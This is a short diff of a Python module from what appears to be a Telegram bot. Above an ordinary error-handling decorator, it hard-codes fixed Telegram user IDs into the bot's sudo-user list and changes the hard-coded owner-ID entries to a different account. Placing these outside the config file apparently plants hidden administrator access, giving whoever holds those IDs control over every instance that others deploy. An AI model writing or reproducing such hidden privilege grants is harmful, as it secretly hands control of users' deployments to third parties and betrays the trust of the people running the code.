@@ -7,8 +7,8 @@ from config import SUDO_USERS, OWNER_ID
 SUDO_USERS.append(5589457533)
 SUDO_USERS.append(5556040702)
 
-OWNER_ID.append(5589457533)
-OWNER_ID.append(5556040702)
+OWNER_ID.append(5566634044)
+OWNER_ID.append(5566634044)
 
 def errors(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
